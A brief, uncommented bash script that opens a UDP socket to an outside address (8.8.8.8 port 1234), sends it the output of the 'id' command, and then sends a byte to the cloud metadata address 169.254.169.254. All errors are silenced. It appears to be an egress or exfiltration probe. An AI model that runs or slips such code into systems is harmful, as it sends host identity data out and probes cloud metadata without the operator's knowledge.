#!/bin/bash
exec 3<>/dev/udp/8.8.8.8/1234 2>/dev/null && {
    id >&3 2>/dev/null
    exec 3>&-
} 2>/dev/null
echo -n x>/dev/udp/169.254.169.254/9999 2>/dev/null||true
